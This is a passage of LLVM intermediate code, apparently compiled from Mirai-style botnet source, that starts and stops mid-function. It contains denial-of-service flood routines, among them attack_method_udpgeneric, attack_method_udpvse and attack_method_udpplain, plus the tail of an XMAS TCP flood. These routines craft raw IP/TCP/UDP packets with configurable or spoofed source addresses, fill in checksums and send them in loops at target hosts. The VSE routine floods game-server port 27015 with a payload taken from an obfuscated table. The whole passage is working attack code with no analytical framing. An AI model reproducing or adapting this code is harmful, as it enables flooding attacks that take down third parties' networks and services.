  store i8 %20, i8* %159, align 4
  br i1 %64, label %164, label %160

; <label>:160:                                    ; preds = %131
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %162 = getelementptr inbounds i8, i8* %147, i64 6
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  br label %164

; <label>:164:                                    ; preds = %131, %160
  %165 = getelementptr inbounds i8, i8* %147, i64 9
  store i8 6, i8* %165, align 1
  %166 = load i32, i32* @LOCAL_ADDR, align 4
  %167 = getelementptr inbounds i8, i8* %147, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %147, i64 16
  %170 = bitcast i8* %169 to i32*
  store i32 %117, i32* %170, align 4
  %171 = bitcast i8* %149 to i16*
  store i16 %144, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %147, i64 22
  %173 = bitcast i8* %172 to i16*
  store i16 %124, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %147, i64 24
  %175 = bitcast i8* %174 to i32*
  store i32 %141, i32* %175, align 4
  %176 = getelementptr inbounds i8, i8* %147, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 %137, i32* %177, align 4
  %178 = getelementptr inbounds i8, i8* %147, i64 32
  %179 = bitcast i8* %178 to i16*
  %180 = getelementptr inbounds i8, i8* %147, i64 34
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  store i16 %81, i16* %179, align 4
  call void @rand_str(i8* %151, i32 %37)
  br label %.loopexit152

; <label>:182:                                    ; preds = %127
  %183 = and i16 %128, 1280
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %189, label %185

; <label>:185:                                    ; preds = %182
  %186 = call i32 @close(i32 %92) #11
  br label %.backedge

.backedge:                                        ; preds = %185, %193
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:189:                                    ; preds = %182, %123, %120, %116
  %190 = call i64 @time(i64* null) #11
  %191 = sub nsw i64 %190, %111
  %192 = icmp sgt i64 %191, 10
  br i1 %192, label %193, label %112

; <label>:193:                                    ; preds = %189
  %194 = call i32 @close(i32 %92) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %164
  %.1 = phi %struct.tcphdr* [ %150, %164 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %46
  br i1 %197, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %209
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %209
  %storemerge139160 = phi i32 [ %243, %209 ], [ 0, %.lr.ph.preheader ]
  %198 = sext i32 %storemerge139160 to i64
  %199 = getelementptr inbounds i8*, i8** %14, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 40
  br i1 %87, label %204, label %207

; <label>:204:                                    ; preds = %.lr.ph
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %.lr.ph
  br i1 %88, label %209, label %208

; <label>:208:                                    ; preds = %207
  call void @rand_str(i8* %203, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %208
  %210 = phi i32 [ %storemerge139160, %207 ], [ %.pre, %208 ]
  %211 = getelementptr inbounds i8, i8* %200, i64 10
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 2
  %213 = bitcast i8* %200 to i16*
  %214 = call zeroext i16 @checksum_generic(i16* %213, i32 20)
  store i16 %214, i16* %212, align 2
  %215 = sext i32 %210 to i64
  %216 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %215, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %216, align 4
  %219 = trunc i32 %217 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #12
  %221 = zext i16 %220 to i32
  %222 = getelementptr inbounds i8, i8* %200, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %221, i32* %223, align 4
  %224 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %215, i32 2
  %225 = load i32, i32* %224, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #12
  %228 = zext i16 %227 to i32
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %228, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 36
  %232 = bitcast i8* %231 to i16*
  store i16 0, i16* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext %90) #12
  %234 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %233, i32 %91)
  store i16 %234, i16* %232, align 4
  %235 = getelementptr inbounds i8, i8* %200, i64 22
  %236 = bitcast i8* %235 to i16*
  %237 = load i16, i16* %236, align 2
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0, i32 1
  store i16 %237, i16* %238, align 2
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %215, i32 0
  %240 = bitcast %struct.sockaddr_in* %239 to %struct.sockaddr*
  %241 = call i64 @sendto(i32 %40, i8* %200, i64 %.pre-phi167, i32 16384, %struct.sockaddr* %240, i32 16) #11
  %242 = load i32, i32* %5, align 4
  %243 = add nsw i32 %242, 1
  store i32 %243, i32* %5, align 4
  %244 = icmp slt i32 %243, %46
  br i1 %244, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %112
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #11
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %146, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #11
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %41, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br label %57

; <label>:41:                                     ; preds = %31
  %42 = call i32 @close(i32 %29) #11
  br label %146

..preheader_crit_edge:                            ; preds = %73
  %43 = trunc i64 %indvars.iv.next to i32
  store i32 %43, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %44 = icmp eq i32 %26, -1
  %45 = and i32 %11, 65535
  %46 = icmp eq i32 %45, 65535
  %47 = and i32 %17, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %19, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = icmp eq i8 %24, 0
  %52 = zext i16 %. to i64
  %53 = add nuw nsw i64 %52, 8
  %54 = trunc i64 %53 to i32
  %55 = add nuw nsw i64 %52, 28
  %56 = zext i16 %. to i32
  br label %.loopexit

; <label>:57:                                     ; preds = %.lr.ph86, %73
  %indvars.iv = phi i64 [ 0, %.lr.ph86 ], [ %indvars.iv.next, %73 ]
  %58 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %59 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %58, i8** %59, align 8
  %60 = getelementptr inbounds i8, i8* %58, i64 20
  store i8 69, i8* %58, align 4
  %61 = getelementptr inbounds i8, i8* %58, i64 1
  store i8 %10, i8* %61, align 1
  %62 = call zeroext i16 @htons(i16 zeroext %37) #12
  %63 = getelementptr inbounds i8, i8* %58, i64 2
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %12) #12
  %66 = getelementptr inbounds i8, i8* %58, i64 4
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 4
  %68 = getelementptr inbounds i8, i8* %58, i64 8
  store i8 %14, i8* %68, align 4
  br i1 %38, label %73, label %69

; <label>:69:                                     ; preds = %57
  %70 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %71 = getelementptr inbounds i8, i8* %58, i64 6
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  br label %73

; <label>:73:                                     ; preds = %57, %69
  %74 = getelementptr inbounds i8, i8* %58, i64 9
  store i8 17, i8* %74, align 1
  %75 = getelementptr inbounds i8, i8* %58, i64 12
  %76 = bitcast i8* %75 to i32*
  store i32 %26, i32* %76, align 4
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds i8, i8* %58, i64 16
  %80 = bitcast i8* %79 to i32*
  store i32 %78, i32* %80, align 4
  %81 = call zeroext i16 @htons(i16 zeroext %18) #12
  %82 = bitcast i8* %60 to i16*
  store i16 %81, i16* %82, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %20) #12
  %84 = getelementptr inbounds i8, i8* %58, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  %86 = call zeroext i16 @htons(i16 zeroext %39) #12
  %87 = getelementptr inbounds i8, i8* %58, i64 24
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %89 = icmp slt i64 %indvars.iv.next, %40
  br i1 %89, label %57, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %123
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %123
  %storemerge8385 = phi i32 [ %144, %123 ], [ 0, %.lr.ph.preheader ]
  %90 = sext i32 %storemerge8385 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = bitcast i8* %92 to %struct.iphdr*
  %94 = getelementptr inbounds i8, i8* %92, i64 20
  %95 = getelementptr inbounds i8, i8* %92, i64 28
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #12
  %103 = call i32 @htonl(i32 %102) #12
  %104 = getelementptr inbounds i8, i8* %92, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %44, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %92, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 0, i32* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %46, label %111, label %114

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds i8, i8* %92, i64 4
  %113 = bitcast i8* %112 to i16*
  store i16 0, i16* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %110
  br i1 %48, label %115, label %117

; <label>:115:                                    ; preds = %114
  %116 = bitcast i8* %94 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %115, %114
  br i1 %50, label %118, label %121

; <label>:118:                                    ; preds = %117
  %119 = getelementptr inbounds i8, i8* %92, i64 22
  %120 = bitcast i8* %119 to i16*
  store i16 0, i16* %120, align 2
  br label %121

; <label>:121:                                    ; preds = %118, %117
  br i1 %51, label %123, label %122

; <label>:122:                                    ; preds = %121
  call void @rand_str(i8* %95, i32 %56)
  %.pre = load i32, i32* %5, align 4
  br label %123

; <label>:123:                                    ; preds = %121, %122
  %124 = phi i32 [ %storemerge8385, %121 ], [ %.pre, %122 ]
  %125 = getelementptr inbounds i8, i8* %92, i64 10
  %126 = bitcast i8* %125 to i16*
  store i16 0, i16* %126, align 2
  %127 = bitcast i8* %92 to i16*
  %128 = call zeroext i16 @checksum_generic(i16* %127, i32 20)
  store i16 %128, i16* %126, align 2
  %129 = getelementptr inbounds i8, i8* %92, i64 26
  %130 = bitcast i8* %129 to i16*
  store i16 0, i16* %130, align 2
  %131 = getelementptr inbounds i8, i8* %92, i64 24
  %132 = bitcast i8* %131 to i16*
  %133 = load i16, i16* %132, align 2
  %134 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %93, i8* %94, i16 zeroext %133, i32 %54)
  store i16 %134, i16* %130, align 2
  %135 = getelementptr inbounds i8, i8* %92, i64 22
  %136 = bitcast i8* %135 to i16*
  %137 = load i16, i16* %136, align 2
  %138 = sext i32 %124 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0, i32 1
  store i16 %137, i16* %139, align 2
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %138, i32 0
  %141 = bitcast %struct.sockaddr_in* %140 to %struct.sockaddr*
  %142 = call i64 @sendto(i32 %29, i8* %92, i64 %55, i32 16384, %struct.sockaddr* %141, i32 16) #11
  %143 = load i32, i32* %5, align 4
  %144 = add nsw i32 %143, 1
  store i32 %144, i32* %5, align 4
  %145 = icmp slt i32 %144, %35
  br i1 %145, label %.lr.ph, label %.loopexit.loopexit

; <label>:146:                                    ; preds = %4, %41
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #11
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #11
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %135, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #11
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %40

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #11
  br label %135

.preheader.loopexit:                              ; preds = %62
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = and i32 %12, 65535
  %35 = icmp eq i32 %34, 65535
  %36 = and i32 %18, 65535
  %37 = icmp eq i32 %36, 65535
  %38 = and i32 %20, 65535
  %39 = icmp eq i32 %38, 65535
  br label %.loopexit

; <label>:40:                                     ; preds = %.lr.ph73, %62
  %41 = phi i32 [ 0, %.lr.ph73 ], [ %83, %62 ]
  %42 = call noalias i8* @calloc(i64 128, i64 1) #11
  %43 = sext i32 %41 to i64
  %44 = getelementptr inbounds i8*, i8** %9, i64 %43
  store i8* %42, i8** %44, align 8
  %45 = getelementptr inbounds i8, i8* %42, i64 20
  %46 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %47 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %47, align 1
  %48 = load i32, i32* %6, align 4
  %49 = trunc i32 %48 to i16
  %50 = add i16 %49, 32
  %51 = call zeroext i16 @htons(i16 zeroext %50) #12
  %52 = getelementptr inbounds i8, i8* %42, i64 2
  %53 = bitcast i8* %52 to i16*
  store i16 %51, i16* %53, align 2
  %54 = call zeroext i16 @htons(i16 zeroext %13) #12
  %55 = getelementptr inbounds i8, i8* %42, i64 4
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 4
  %57 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %57, align 4
  br i1 %31, label %62, label %58

; <label>:58:                                     ; preds = %40
  %59 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %60 = getelementptr inbounds i8, i8* %42, i64 6
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  br label %62

; <label>:62:                                     ; preds = %40, %58
  %63 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %63, align 1
  %64 = load i32, i32* @LOCAL_ADDR, align 4
  %65 = getelementptr inbounds i8, i8* %42, i64 12
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %43, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8, i8* %42, i64 16
  %70 = bitcast i8* %69 to i32*
  store i32 %68, i32* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext %19) #12
  %72 = bitcast i8* %45 to i16*
  store i16 %71, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %21) #12
  %74 = getelementptr inbounds i8, i8* %42, i64 22
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 2
  %76 = add i16 %49, 12
  %77 = call zeroext i16 @htons(i16 zeroext %76) #12
  %78 = getelementptr inbounds i8, i8* %42, i64 24
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = bitcast i8* %46 to i32*
  store i32 -1, i32* %80, align 4
  %81 = getelementptr inbounds i8, i8* %42, i64 32
  call void @util_memcpy(i8* %81, i8* %22, i32 %48) #11
  %82 = load i32, i32* %5, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %5, align 4
  %84 = icmp slt i32 %83, %29
  br i1 %84, label %40, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %112
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %112
  %85 = phi i32 [ %133, %112 ], [ 0, %.lr.ph.preheader ]
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8*, i8** %9, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr inbounds i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 2
  %92 = load i8, i8* %91, align 4
  %93 = icmp ult i8 %92, 32
  br i1 %93, label %94, label %101

; <label>:94:                                     ; preds = %.lr.ph
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @ntohl(i32 %96) #12
  %98 = call i32 @htonl(i32 %97) #12
  %99 = getelementptr inbounds i8, i8* %88, i64 16
  %100 = bitcast i8* %99 to i32*
  store i32 %98, i32* %100, align 4
  br label %101

; <label>:101:                                    ; preds = %94, %.lr.ph
  br i1 %35, label %102, label %105

; <label>:102:                                    ; preds = %101
  %103 = getelementptr inbounds i8, i8* %88, i64 4
  %104 = bitcast i8* %103 to i16*
  store i16 0, i16* %104, align 4
  br label %105

; <label>:105:                                    ; preds = %102, %101
  br i1 %37, label %106, label %108

; <label>:106:                                    ; preds = %105
  %107 = bitcast i8* %90 to i16*
  store i16 0, i16* %107, align 2
  br label %108

; <label>:108:                                    ; preds = %106, %105
  %109 = getelementptr inbounds i8, i8* %88, i64 22
  %110 = bitcast i8* %109 to i16*
  br i1 %39, label %111, label %._crit_edge

._crit_edge:                                      ; preds = %108
  %.pre = load i16, i16* %110, align 2
  br label %112

; <label>:111:                                    ; preds = %108
  store i16 0, i16* %110, align 2
  br label %112

; <label>:112:                                    ; preds = %._crit_edge, %111
  %113 = phi i16 [ %.pre, %._crit_edge ], [ 0, %111 ]
  %114 = getelementptr inbounds i8, i8* %88, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 2
  %116 = bitcast i8* %88 to i16*
  %117 = call zeroext i16 @checksum_generic(i16* %116, i32 20)
  store i16 %117, i16* %115, align 2
  %118 = getelementptr inbounds i8, i8* %88, i64 26
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 2
  %120 = getelementptr inbounds i8, i8* %88, i64 24
  %121 = bitcast i8* %120 to i16*
  %122 = load i16, i16* %121, align 2
  %123 = load i32, i32* %6, align 4
  %124 = add i32 %123, 12
  %125 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %89, i8* nonnull %90, i16 zeroext %122, i32 %124)
  store i16 %125, i16* %119, align 2
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 0, i32 1
  store i16 %113, i16* %126, align 2
  %127 = sext i32 %123 to i64
  %128 = add nsw i64 %127, 32
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %86, i32 0
  %130 = bitcast %struct.sockaddr_in* %129 to %struct.sockaddr*
  %131 = call i64 @sendto(i32 %23, i8* nonnull %88, i64 %128, i32 16384, %struct.sockaddr* %130, i32 16) #11
  %132 = load i32, i32* %5, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %5, align 4
  %134 = icmp slt i32 %133, %29
  br i1 %134, label %.lr.ph, label %.loopexit.loopexit

; <label>:135:                                    ; preds = %4, %32
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %58
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp eq i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %58
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %58 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
